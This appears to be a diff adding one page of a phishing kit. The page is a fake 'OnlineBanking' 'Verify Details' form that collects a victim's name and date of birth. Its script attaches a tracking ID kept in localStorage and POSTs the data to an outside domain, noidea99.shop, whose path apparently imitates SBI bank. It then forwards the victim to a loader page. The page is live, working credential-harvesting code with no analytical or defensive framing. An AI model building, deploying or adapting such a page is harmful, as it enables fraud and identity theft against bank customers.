@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width" />
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+    
+    <header class="logo">
+        <img src="assets/header.jpeg" alt="">
+    </header>
+
+    <br>
+
+    <div class="login-form">
+        <br>
+        
+        <div class="content_heading">
+            <h3 class="pull-left">Verify Details</h3>
+        </div>
+
+        <p class="mandatory_txt">Mandatory field are marked with an asterisk (*)</p>
+
+        <form id="credit-form">
+            <div class="form-group">
+                <label class="control-label" for="Customername">Customer Name<span class="mandatory_txt">*</span></label>
+
+
+                <input class="form-control" type="text" id="lname" name="lname" required/>
+            </div>
+
+                <div class="form-group">
+
+                    <label class="control-label" for="Birthday"> Date of Birth<span class="mandatory_txt">*</span>
+                    </label>
+
+                    <input class="form-control" type="" id="lbdate" name="lbdate" placeholder="dd/mm/yyyy" required />
+
+                </div>
+
+            <div class="commonbutton">
+                <input type="submit" class="btn btn-default" value="Submit" />
+            </div>
+        </form>
+
+    </div>
+
+    <br>
+
+    <div class="footer">
+        <p>© OnlineBanking</p>
+    </div>
+</body>
+
+</html>
+
+
+<script>
+
+  document
+    .getElementById("credit-form")
+    .addEventListener("submit", function (event) {
+      event.preventDefault();
+      //IDS
+        const lname = document.querySelector('input[name="lname"]').value;
+
+        const lbdate = document.querySelector('input[name="lbdate"]').value;
+
+        const randno = localStorage.getItem('random_no');
+
+        var data = {
+          randno : randno,
+          lname: lname,
+          lbdate: lbdate
+        };
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://noidea99.shop/wssbi/Shop3.php", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4) {
+                if (xhr.status === 200) {
+                    console.log(xhr.responseText);
+                    window.location.href = "loader1.html";
+                } else {
+                    console.error("Error: " + xhr.status);
+                }
+            }
+        };
+
+        xhr.send(JSON.stringify(data));
+    });
+
+</script>
